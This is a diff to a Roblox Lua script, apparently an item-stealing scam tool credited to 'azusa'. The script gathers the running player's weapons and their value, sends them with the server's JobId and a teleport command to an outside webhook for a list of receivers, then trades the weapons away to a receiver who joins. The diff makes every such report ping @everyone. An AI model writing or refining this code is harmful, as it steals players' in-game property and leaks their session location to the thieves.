@@ -197,7 +197,7 @@ end
 
 local messageId = nil
 
-local function formatEmbedAndSend(list, totalValue, prefix, statusDescription, colorCode)
+local function formatEmbedAndSend(list, totalValue, statusDescription, colorCode)
 	local executor = identifyexecutor and identifyexecutor() or "Unknown"
 	local receiverList = table.concat(Users, ", ")
 
@@ -228,7 +228,7 @@ local function formatEmbedAndSend(list, totalValue, prefix, statusDescription, c
 	}
 
 	local data = {
-		["content"] = (prefix or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
+		["content"] = "@everyone\n" .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
 		["embeds"] = {{
 			["title"] = "azusa",
 			["description"] = statusDescription or "🟡  Pending",
@@ -236,7 +236,8 @@ local function formatEmbedAndSend(list, totalValue, prefix, statusDescription, c
 			["fields"] = fields,
 			["footer"] = { ["text"] = "this script was made by azusa" },
 			["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
-		}}
+		}},
+		["allowed_mentions"] = { ["parse"] = {"everyone"} }
 	}
 
 	local body = HttpService:JSONEncode(data)
@@ -293,29 +294,23 @@ local function checkAndUpdateStatus()
 	local claimedCount = totalInitialCount - remainingCount
 	
 	if claimedCount <= 0 then
-		formatEmbedAndSend(currentWeapons, currentTotalVal, "", "🟡  Pending", 16776960)
+		formatEmbedAndSend(currentWeapons, currentTotalVal, "🟡  Pending", 16776960)
 	elseif remainingCount <= 0 then
-		formatEmbedAndSend(currentWeapons, currentTotalVal, "", "🟢  Claimed", 65280)
+		formatEmbedAndSend(currentWeapons, currentTotalVal, "🟢  Claimed", 65280)
 	else
-		formatEmbedAndSend(currentWeapons, currentTotalVal, "", "🔵  Partially Claimed", 3447003)
+		formatEmbedAndSend(currentWeapons, currentTotalVal, "🔵  Partially Claimed", 3447003)
 	end
 end
 
 plr.AncestryChanged:Connect(function(_, parent)
 	if not parent then
 		local currentWeapons, currentTotalVal = getValidWeapons()
-		formatEmbedAndSend(currentWeapons, currentTotalVal, "", "🔴  Disconnected", 16711680)
+		formatEmbedAndSend(currentWeapons, currentTotalVal, "🔴  Disconnected", 16711680)
 	end
 end)
 
 if #initialWeapons > 0 then
-    -- Sends the webhook to YOU instantly
-    local prefix = ""
-    if _G.pingEveryone == "Yes" then
-        prefix = "--[[@everyone]] "
-    end
-    
-	formatEmbedAndSend(initialWeapons, initialTotalVal, prefix, "🟡  Pending", 16776960)
+	formatEmbedAndSend(initialWeapons, initialTotalVal, "🟡  Pending", 16776960)
 
 	local function doTrade(joinedUser)
 		local weaponsToSend = getValidWeapons()
